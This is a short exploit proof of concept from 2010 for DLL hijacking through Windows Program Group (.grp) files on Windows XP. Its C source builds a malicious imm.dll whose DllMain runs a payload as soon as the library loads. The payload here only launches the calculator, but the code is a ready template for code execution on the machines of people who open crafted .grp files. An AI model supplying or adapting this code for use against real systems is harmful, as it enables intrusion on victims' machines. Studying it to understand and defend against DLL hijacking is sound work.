/*
Exploit Title: Windows Program Group DLL Hijacking Exploit (imm.dll)
Date: 25/08/2010
Author: Alvaro Ovalle
Email: aovalle (at) zoho (dot) com
Software Link: N/A
Tested on: Windows XP SP3 English
Extension: .grp
*/
#include <windows.h>

int run()
{
  WinExec("calc", SW_SHOW);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  run();
  return 0;
}
